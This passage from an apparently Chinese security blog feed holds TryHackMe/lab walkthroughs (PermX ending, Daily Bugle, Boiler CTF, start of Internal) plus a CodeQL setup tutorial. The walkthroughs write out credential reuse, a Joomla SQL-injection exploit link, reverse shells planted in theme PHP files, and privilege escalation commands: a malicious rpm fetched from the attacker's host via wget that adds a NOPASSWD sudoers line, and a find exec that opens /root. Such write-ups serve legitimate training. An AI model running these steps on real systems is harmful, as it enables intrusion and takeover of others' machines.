src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201256827.png" alt="image.png"><br>看到home处还有个用户，我么也还是www-data，接下来就应该想办法提权成mtz</p><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>反正就是慢慢找慢慢看，最后在&#x2F;app&#x2F;config&#x2F;configuration.php找到一些有用的东西<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201302538.png" alt="image.png"><br>数据库账号密码<br>chamilo&#x2F;03F6lY3uXAP2bkW8<br>连连看<br>直接卡死了，连不上去，换种思路，有没有可能存在密码复用呢，再结合刚才我们找到的账号，继续连<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201308676.png" alt="image.png"><br>连上去了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201308684.png" alt="image.png"><br>继续信息收集<br>sudo -s<br>没权限<br>uname -a<br>Linux permx 5.15.0-113-generic<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201312447.png" alt="image.png"><br>这个好像可以，但看了下又没有gcc，改gcc什么的太麻烦了，找一下别的方法提权先<br>sudo -l<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201314360.png" alt="image.png"><br>发现我们可以运行&#x2F;opt&#x2F;acl.sh，看看文件内容<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201315190.png" alt="image.png"><br>看不懂，没关系，丢给gpt<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201316022.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201317765.png" alt="image.png"><br>简单来说就是如上，虽然这里做了一些限制，但我们可以通过软连接连出去以突破限制<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201324125.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409201325033.png" alt="image.png"><br>完成</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY13-Daily Bugle</title>
    <link href="/2024/10/11/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY13-Daily%20Bugle/"/>
    <url>/2024/10/11/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY13-Daily%20Bugle/</url>
    
    <content type="html"><![CDATA[<p><a href="https://tryhackme.com/r/room/dailybugle">尝试黑客 |每日号角 — TryHackMe | Daily Bugle</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110939387.png" alt="image.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110939797.png" alt="image.png"></p><p>打开网站</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110939327.png" alt="image.png"></p><p>spiderman抢劫了银行</p><p>可以看到用户Super User</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110940116.png" alt="image-20240406090204978.png"></p><p>可以看到打开了三个端口对应ssh，http，mysql</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110940895.png" alt="image-20240406091315076.png"></p><p>目录扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110940279.png" alt="image-20240406091252423.png"></p><p>我们在README.txt中可以看到它的版本大概是3.7，但根据提示后面还有个.几</p><p>我们采用工具辅助我们进行分析（joomscan）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110941744.png" alt="image-20240406091729387.png"></p><p>扫描出版本是3.7.0<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110941342.png" alt="image-20240406091840394.png"></p><p>找到这个版本有个sql注入漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110941940.png" alt="image-20240406092022262.png"></p><p>它让我sqlmap一把梭</p><p>但是thm中提示到不如用python脚本</p><p><a href="https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py">https://github.com/XiphosResearch/exploits/blob/master/Joomblah/joomblah.py</a></p><p>就是这个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110942222.png" alt="image-20240406100953317.png"></p><p>拿下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110942102.png" alt="image-20240406101036041.png"></p><p>很多题都是用那个john解，当然能在线解肯定更快<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110943637.png" alt="image-20240406101319013.png"></p><p>登进后台<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110943804.png" alt="image-20240406101342139.png"></p><p>老规矩上传反弹shell</p><p><a href="http://10.10.235.85/administrator/index.php?option=com_templates&view=template&id=503&file=aG9tZQ==">http://10.10.235.85/administrator/index.php?option=com_templates&amp;view&#x3D;template&amp;id&#x3D;503&amp;file&#x3D;aG9tZQ&#x3D;&#x3D;</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110943949.png" alt="image-20240406101709191.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110943793.png" alt="image-20240406101721658.png"></p><p>成功进入后台</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110944399.png" alt="image-20240406101917885.png"></p><p>我们拥有的是apache的权限，想办法进到apache所在目录</p><p>&#x2F;var&#x2F;www&#x2F;html</p><p>里面有configuration.php</p><p>打开看到<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110944677.png" alt="image-20240406102748703.png"></p><p>这里password跟secret都很可疑</p><p>继续找，在&#x2F;home中找到</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110944625.png" alt="image-20240406102908269.png"></p><p>试下密码，直接成功</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110945400.png" alt="image-20240406103002222.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110945135.png" alt="image-20240406103017284.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110945566.png" alt="image-20240406103107342.png"></p><p>yum提权</p><p><a href="https://gtfobins.github.io/gtfobins/yum/">yum | GTFOBins</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110945991.png" alt="image-20240406104036186.png"></p><p>两种办法，我们用第一种</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110946720.png" alt="image-20240406104057723.png"></p><p>echo ‘echo “jjameson ALL&#x3D;(root) NOPASSWD:ALL”&gt;&gt;&#x2F;etc&#x2F;sudoers’ &gt; sudo.sh</p><p>gem install fpm</p><p>如果没装fpm用这个指令</p><p>fpm -n root -s dir -t rpm -a all –before-install sudo.sh .</p><p>创建fpm</p><p>本机上</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110946128.png" alt="image-20240406105115112.png"></p><p>目标机上输入</p><p>wget <a href="http://10.13.54.129/root-1.0-1.noarch.rpm">http://10.13.54.129/root-1.0-1.noarch.rpm</a><br>​<br>sudo yum localinstall -y root-1.0-1.noarch.rpm<br>​<br>sudo su</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110946249.png" alt="image-20240406105054302.png"></p><p>提权成功</p><p>到root目录cat就行，十分简单就不截图了</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410110946327.png" alt="image-20240406105309979.png"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CodeQL基础配置</title>
    <link href="/2024/09/18/CodeQL%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/"/>
    <url>/2024/09/18/CodeQL%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="下载CodeQL的二进制可执行文件"><a href="#下载CodeQL的二进制可执行文件" class="headerlink" title="下载CodeQL的二进制可执行文件"></a>下载CodeQL的二进制可执行文件</h2><p><a href="https://github.com/github/codeql-cli-binaries">github&#x2F;codeql-cli-binaries: Binaries for the CodeQL CLI</a><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151444762.png"><br>我们选择下载这个，解压文件夹，放到一个新的文件夹下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151502907.png" alt="image.png"></p><h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>文件管理，右键此电脑，点击属性<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151503537.png" alt="image.png"><br>我这台winserver2022在最右边找到高级系统设置（win11应该在中间能看到）<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151504549.png" alt="image.png"><br>选择环境变量<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151504090.png" alt="image.png"><br>在系统变量中找到Path<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151505439.png" alt="image.png"><br>在最下面加上CodeQL的路径即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151508727.png" alt="image.png"><br>然后随便开个cmd<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151510501.png" alt="image.png"><br>能看到这些内容就证明成功了</p><h2 id="下载标准规则库"><a href="#下载标准规则库" class="headerlink" title="下载标准规则库"></a>下载标准规则库</h2><p><a href="https://github.com/github/codeql">github&#x2F;codeql: CodeQL: the libraries and queries that power security researchers around the world, as well as code scanning in GitHub Advanced Security</a><br>在这里直接下载zip即可<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151511762.png" alt="image.png"><br>然后解压到跟刚才二进制文件的同一文件夹下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151514079.png" alt="image.png"></p><h2 id="VSCode配置"><a href="#VSCode配置" class="headerlink" title="VSCode配置"></a>VSCode配置</h2><p>在扩展商店里找到CodeQL插件并安装<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151515873.png" alt="image.png"><br>安装好后还要进行一些设置，这里记得要先重启一下，看到左边有codeql图标再进行下一步<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151516625.png" alt="image.png"><br>点击设置按钮，并选择扩展设置<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151519700.png" alt="image.png"><br>到这里基本完成</p><h1 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h1><h2 id="WEBGOAT"><a href="#WEBGOAT" class="headerlink" title="WEBGOAT"></a>WEBGOAT</h2><p>在<a href="https://susec.xyz/2024/08/01/%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA/#%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83">靶场环境搭建</a>这篇文章中我们通过jar包形式搭建了webgoat的环境，这次我们要通过下它的zip包来进行源码分析<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151524892.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409152145207.png" alt="image.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151530855.png" alt="image.png"></p><p>在codeql文件夹中新建source文件夹用于放我们准备进行分析的源码，再建一个databases，一个my-query文件夹，后面会用到<br><code>codeql database create databases/WebGoat-db --language=java --command=&quot;mvn clean install -Dskiptests&quot; --source-root=C:\CodeQL\source\WebGoat --overwrite</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151654690.png" alt="image.png"><br>如果出现报错，可能是maven环境没配好，可能是jdk版本不对，还有可能是代码格式化问题等等等等，这些具体问题就百度，我这里简单讲几个：<br>maven环境问题：<br>Unmatched arguments from index 3: ‘clean’, ‘install’, ‘-Dskiptests’ Try codeql database create –help for usage help.<br>出现这个基本就是maven没有弄到环境变量里，这时你在新的cmd里试试mvn -v，报错就百分百是maven问题，去把maven加入到环境变量即可</p><p>然后出现一堆中文乱码：<br>这个八成是java版本问题，换一下java版本试试</p><p>代码格式化问题：<br>其实我没遇到，但我还是试了下，到source的WebGoat目录打开cmd，输入mvn spotless:apply</p><p>或者你遇到了：<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151730013.png" alt="image.png"><br>那就试试只输入：<br><code>codeql database create databases/WebGoat-db --language=java --source-root=&lt;路径&gt;\WebGoat --overwrite</code><br>经过我测试这样子也能用<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151734236.png" alt="image.png"><br>长这样基本就是没问题了</p><p>然后就到my_query文件夹，这个文件夹是用来存放后续编写的CodeQL规则的，先创建一个规则，名为qlpack.yml</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">name</span>:my-query<br><span class="hljs-attribute">version</span>:<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">libraryPathDependencies</span>:codeql-java<br></code></pre></td></tr></table></figure><p>再创建一个test1.ql</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> java<br><br><span class="hljs-keyword">from</span> <span class="hljs-keyword">Call</span> c<br><span class="hljs-keyword">select</span> c<br></code></pre></td></tr></table></figure><p>要将codeql-main文件夹加入到工作区<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409152107425.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409152108843.png" alt="image.png"></p><p>然后到codeql插件里，把WEBGoat-db加入到插件的databases里，并选择java语言<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409152110198.png" alt="image.png"><br>原本是上面这样，选择from a folder，变成下面这样<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409152110652.png" alt="image.png"><br>然后就在刚才建的test1.ql里开始测试就行了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409152317085.png" alt="image.png"><br>然后我们就能看到webgoat里面各种方法的调用，再进行人工筛选审计，挖出一个个0day<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409152319619.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代码审计</tag>
      
      <tag>CodeQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY12-Boilerctf</title>
    <link href="/2024/09/17/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY12-boilerctf/"/>
    <url>/2024/09/17/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY12-boilerctf/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY12-Boilerctf"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY12-Boilerctf" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY12-Boilerctf"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY12-Boilerctf</h1><p><a href="https://tryhackme.com/r/room/boilerctf2">尝试黑客 |锅炉 CTF — TryHackMe | Boiler CTF</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302775.png" alt="image-20240405225533171"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302504.png" alt="image-20240405225953972"></p><p>先进行端口扫描，扫出来三个，其中21端口ftp允许匿名访问</p><p>我们先试试</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302521.png" alt="image-20240405230103287"></p><p>有一个.info.txt</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302609.png" alt="image-20240405230308617"></p><p>看不懂，但目测是凯撒加密</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302299.png" alt="image-20240405230403729"></p><p>被嘲讽了，他告诉我列举是关键</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302356.png" alt="image-20240405230427455"></p><p>进行目录扫描</p><p>看到joomla网站</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302220.png" alt="image-20240405230950367"></p><p>打开看到用户名joomla</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302232.png" alt="image-20240405231037345"></p><p>一个apache的网站，没什么用</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302728.png" alt="image-20240405231114235"></p><p>这里给出很多个不让访问的页面，还有一串奇怪的数字，这里猜测是ascii码</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302902.png" alt="image-20240405231410338"></p><p>转换之后长这样，又像是base64</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302698.png" alt="image-20240405231433375"></p><p>然后长这样</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302662.png" alt="image-20240405231514682"></p><p>md5解密，kidding，ok，just kidding</p><p>这时候我们回去题目看看，发现最高端口上有什么我们答不出来，再加上之前给的提示枚举，我们猜测需要更为详细的进行信息收集与分析，我们再进行一次完整的端口扫描，然后再在joomla基础上再进行一次目录扫描</p><p>全部端口扫描比较慢，先看目录</p><p><strong><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302381.png" alt="image-20240405232117613"></strong></p><p>好好好，东西够多哈</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302847.png" alt="image-20240405232301348"></p><p>登录框，我们只知道账号名可能是joomla，这里简单测试下弱口令，不成功，先放着</p><p>bin打开一片空白</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302541.png" alt="image-20240405232458354"></p><p>build是个目录</p><p>等等等等</p><p>有不少文件遍历，还有一些看起来很重要但暂时用不到的文件泄露，实在看不下去，去看wp，发现还是扫漏了一个_test</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302430.png" alt="image-20240405233432113"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302357.png" alt="image-20240405233542937"></p><p>发现漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151302456.png" alt="image-20240405233811160"></p><p>这个还要自己执行，比较麻烦，还是用python那个</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303492.png" alt="image-20240405233925767"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303389.png" alt="image-20240405234012678"></p><p>拿到ssh</p><p>username:</p><p>basterd</p><p>password：</p><p>superduperp@$$</p><p>这时候我们再看看我们的端口扫描</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303841.png" alt="image-20240405234327485"></p><p>还开放了个55007端口（真服了）</p><p>虽然我们不知道它具体是什么服务，但是既然我们拿到ssh登陆的信息，这里直接猜测他是ssh的端口进行登录</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303993.png" alt="image-20240405235023178"></p><p>（这里顺便给个前面的答案汇总）</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303484.png" alt="image-20240405234503954"></p><p>果不其然，成功进入后台</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303242.png" alt="image-20240405234542272"></p><p>当前文件有一个奇怪的用户 stroner，打开这个文件看看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303933.png" alt="image-20240405234713744"></p><p>这里又给出一个ssh的密码：</p><p>superduperp@$$no1knows</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303882.png" alt="image-20240405235144732"></p><p>找到.secret</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303007.png" alt="image-20240405235205571"></p><p>这个就是user.txt</p><p>前面一点点看耗时太长了，这次用点小工具来提权</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303917.png" alt="image-20240406000441246"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303894.png" alt="image-20240406000503999"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303768.png" alt="image-20240406000711404"></p><p>这里本来以为可以lxd提权，但看到下面写着notthistime，知道这次应该行不通</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303782.png" alt="image-20240406000415968"></p><p>后面看到find也被标出来，就用find提权</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303323.png" alt="image-20240406001153990"></p><p>拿下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find . -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">chmod</span> 777 /root \;<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151303402.png" alt="image-20240406001233615"></p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>重生之我在try hack me打靶，励志成为赛博高手-DAY11-Internal</title>
    <link href="/2024/09/16/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY11-Internal/"/>
    <url>/2024/09/16/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E5%9C%A8try%20hack%20me%E6%89%93%E9%9D%B6%EF%BC%8C%E5%8A%B1%E5%BF%97%E6%88%90%E4%B8%BA%E8%B5%9B%E5%8D%9A%E9%AB%98%E6%89%8B-DAY11-Internal/</url>
    
    <content type="html"><![CDATA[<h1 id="重生之我在try-hack-me打靶，励志成为赛博高手-DAY11-Internal"><a href="#重生之我在try-hack-me打靶，励志成为赛博高手-DAY11-Internal" class="headerlink" title="重生之我在try hack me打靶，励志成为赛博高手-DAY11-Internal"></a>重生之我在try hack me打靶，励志成为赛博高手-DAY11-Internal</h1><p>还是先nmap扫</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259410.png" alt="image-20240405111812138"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259729.png" alt="image-20240405111837723"></p><p>扫扫目录</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259031.png" alt="image-20240405111755110"></p><p>就这么来看是有搭建了个wordpress</p><p>不知道为什么网络特别卡，它的网站要么打不开要么加载不完全</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259144.png" alt="image-20240405113826043"></p><p>大致看看吧</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259177.png" alt="image-20240405113840034"></p><p>后面发现问题了，它要改一下hosts文件才能更好的访问</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259629.png" alt="image-20240405114739871"></p><p>就在hosts加上</p><p>10.10.xx.xx internal.thm即可</p><p>编辑主机文件的原因 1：你可能已经知道，如果你向任何主机名发出任何类型的请求，对应域名将被转换为 IP 地址，在 TCP&#x2F;IP 中，只传输 IP 地址而不传输主机名。 在 HTTP(S) 等服务中，你可以在“Host”HTTP 标头中传输主机名，如果你通过带有 IP 地址的 URL 来访问网站，Host 标头将包含 IP 地址，如果你访问其中包含主机名的 URL，主机标头将包含该主机名，它取决于 Web 服务器如何处理基于该标头的请求。 在 TLS 握手中，你还可以在“server_name”扩展名中发送主机名。 因此，如果底层后端服务仅响应主机名，则最简单的从本地发送主机名的解决方案是修改你的主机文件，然后你使用的软件（例如web浏览器）将完成剩下的解析工作。</p><p>编辑主机文件的原因2：一个IP地址可以通过虚拟主机（vhost）技术在同一个web服务器上托管多个网站，如果目标服务器有多个网站，那么我们就很难弄清楚哪个是哪个。 所以通过在主机文件中指向具体的DNS，实际上是在表明你的应用程序仅针对特定域。</p><p>编辑主机文件的原因3：如果目标有子域怎么办？ 我们如何在没有指定主域的情况下枚举它们？ 在枚举可能存在的域时，你必须预料到目标可能存在子域，因此你需要知道主域本身，然后就可以通过已知的 IP 地址枚举子域。</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259007.png" alt="image-20240405114859250"></p><p>有一个Hello world文章</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259415.png" alt="image-20240405114947992"></p><p>点开一看 by admin</p><p>所以我们可以猜测有个admin账号</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259006.png" alt="image-20240405115138682"></p><p>根据网络信息我们猜测这是wordpress的5.4.2</p><p>搜索下有没有什么漏洞</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259928.png" alt="image-20240405115308273"></p><p>似乎没找出什么特殊的漏洞</p><p>我们用个专门针对wordpress的扫描工具试试</p><p>WPScan</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259073.png" alt="image-20240405115623412"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259195.png" alt="image-20240405121702214"></p><p>这里看到用了主题twentyseventeen</p><p>还有确定了用户admin</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259023.png" alt="image-20240405121847619"></p><p>这里进行下爆破</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259883.png" alt="image-20240405125507478"></p><p>得到密码my2boys</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259743.png" alt="image-20240405122246263"></p><p>登陆到后台</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259516.png" alt="image-20240405122412958"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259303.png" alt="image-20240405123213683"></p><p>这里可以对一些php直接进行修改，那老规矩，上传个反弹shell</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259268.png" alt="image-20240405123557895"></p><p>这里最好是对主题修改，因为刚才我们检测到2017</p><p>就把404改了</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151259364.png" alt="image-20240405123807832"></p><p>然后nc监听，然后访问</p><p><a href="http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php">http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</a></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258396.png" alt="image-20240405123837907"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258610.png" alt="image-20240405123939930"></p><p>我们通过find | grep user.txt发现</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258669.png" alt="image-20240405124438798"></p><p>但是我们没办法进行读取</p><p>那应该就是方向错了，继续找找看</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258040.png" alt="image-20240405124710444"></p><p>我们发现有个叫aubreanna的用户，直接进入会没有权限</p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202409151258320.png" 